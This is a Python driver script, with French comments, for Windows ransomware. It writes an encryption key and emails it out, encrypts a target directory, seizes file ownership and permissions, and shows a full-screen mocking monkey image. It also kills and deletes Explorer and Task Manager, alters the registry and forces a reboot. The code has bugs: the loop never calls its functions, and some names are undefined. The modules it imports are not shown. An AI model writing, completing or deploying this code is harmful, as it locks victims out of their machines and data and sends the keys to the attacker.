#!/usr/env/python
#coding:utf-8

from modules.chiffrement import cryptage
from modules.reseau import network
from modules.permi import acquisition
from modules.display import taunt
import os, time, sys

#VARIABLE D'ENVIRONNEMENT
name_key = os.environ["USERNAME"]
lettre = os.environ["SystemDrive"]

# APPEL DE CLASSE/FONCTION
crypt = cryptage.Des_Chiffres_et_des_Lettres()
per = acquisition.Seek_and_Destroy()
mon = taunt.Monkey()

# CREATION + ECRITURE DE LA CLEF
crypt.write_key(name_key)

# ENVOI DE LA CLEF PAR MAIL
network.courrier()

# CHIFFREMENT DU REPERTOIRE CIBLE
crypt.listing()

# appropriation des processus et prise des permissions
# kill les processus, écriture dans le registre windows
# affichage l'image en fullscreen
# procède à un redémarrage
if crypt.listing():

    # déclaration de l'objet PIL qui contient l'image à afficher
    pilImage = Image.open(f"{lettre}\\Users\\{user}\\AppData\\Roaming\\monkey\\monkeylol.jpg")

    liste_fonction = ['per.prise_de_own()', 'per.prise_de_permi()', 'mon.display_monkeylol(pilImage)', 'per.kill_process_explorer()', 'per.delete_process_explorer()', 'per.delete_tskmgr()', \
                        'per.suppression_clef()', 'per.ecriture_registre()', 'per.counter_measure']
    for function in liste_fonction:
        function

    os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")

# Si la boucle ne fonctionne pas, décommenter ce bloc d'instruction
# afin d'enclencher les fonctions suivantes de façon séquentielle
"""
per.prise_de_own()
per.prise_de_permi()
mon.display_monkeylol(pilImage)
per.kill_process_explorer()
per.delete_process_explorer()
per.delete_tskmgr()
per.suppression_clef()
per.ecriture_registre()
"""
